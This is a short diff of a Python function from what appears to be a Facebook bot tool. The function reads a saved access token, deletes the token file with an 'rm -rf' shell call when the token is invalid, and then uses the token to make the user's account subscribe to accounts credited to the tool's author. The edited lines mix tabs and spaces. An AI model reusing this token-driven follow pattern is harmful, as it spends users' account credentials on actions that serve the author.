@@ -151,7 +151,7 @@ def bot_follow():
 		toket=open('login.txt','r').read()
     except IOError:
 		print("   [!] Token Invalid")
-        os.system('rm -rf login.txt')
+        	os.system('rm -rf login.txt')
         menu()
     requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X
     requests.post('https://graph.facebook.com/1673250723/subscribers?access_token=' + toket)      #Dapunta Ratya
